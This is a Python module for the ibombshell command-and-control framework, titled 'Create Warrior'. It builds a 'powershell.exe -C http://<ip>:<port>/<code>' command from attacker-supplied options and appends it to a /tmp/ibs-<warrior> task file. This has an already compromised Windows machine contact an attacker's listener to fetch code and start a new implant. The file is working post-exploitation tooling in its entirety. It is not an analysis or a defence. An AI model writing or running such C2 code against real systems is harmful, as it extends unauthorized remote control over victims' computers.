from pathlib import Path

from termcolor import colored, cprint

from module import Module


class CustomModule(Module):
    def __init__(self):
        information = {"Name": "Create Warrior",
                       "Description": "Create a new warrior. Start-Job way!",
                       "Author": "@toolsprods"}

        # -----------name-----default_value--description--required?
        options = {"warrior": [None, "Warrior in war", True],
                    "ip": [None,"IP or domain listener ibombshell",True],
                    "port": [None,"Port listener ibombshell",False],
                    "code": [None,"Resource for c2 of ibombshell",True]}

        # Constructor of the parent class
        super(CustomModule, self).__init__(information, options)

    # This module must be always implemented, it is called by the run option
    def run_module(self):

        warrior_exist = False
        for p in Path("/tmp/").glob("ibs-*"):
            if str(p)[9:] == self.args["warrior"]:
                warrior_exist = True
                break

        if warrior_exist:
            function = ""

            if self.args["port"]:
                function += 'powershell.exe -C http://{}:{}/{}'.format(self.args["ip"], self.args["port"], self.args["code"])
            else:
                function += 'powershell.exe -C http://{}/{}'.format(self.args["ip"],self.args["code"])

            with open('/tmp/ibs-{}'.format(self.args["warrior"]), 'a') as f:
                f.write(function)

            cprint ('[+] Done!', 'green')

        else:
            cprint ('[!] Failed... Warrior don´t found', 'red')
